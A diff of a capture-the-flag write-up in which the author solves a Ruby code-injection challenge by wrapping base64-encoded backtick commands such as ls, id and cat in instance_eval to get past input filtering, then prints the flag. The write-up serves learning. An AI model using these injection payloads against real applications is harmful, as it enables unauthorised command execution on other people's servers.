@@ -43,6 +43,7 @@ The string below is \`ls\` in base64
 "+ Base64.decode64('YGxzYA==') +"
 ```
 Results: 
+
 ![swan_3](https://user-images.githubusercontent.com/30396122/205585650-53c78f41-9716-44a1-9c67-524d2eaf0909.png)
 
 Thoughts: Okay, backticks are bypassing the filtering however it is processing the base64 payload as a string not a command. 
@@ -57,6 +58,7 @@ The string below is \`id\` in base64
 "+ instance_eval(Base64.decode64('YGlkYA=='))  +"
 ```
 Results: 
+
 ![swan_4](https://user-images.githubusercontent.com/30396122/205587505-26c7335e-d53e-4719-938f-e5abde105a6c.png)
 ##
 #### 10. Now simply investigate the files with \`ls\` and then enter \`cat [FLAG FILE NAME]\` encoded 
@@ -70,5 +72,6 @@ The string below is \`cat [FLAG FILE NAME]\` in base64
 ```
 WACTF{3V41_15_t7uLy_evIl_bf3dbozaeb7b2}
 ```
+##
 ## Conclusion 
 This was an awesome CTF and I enjoyed it, mainly because I was pretty much on the right track the whole time. Plus I would classify this as my first completely solo CTF solve! 
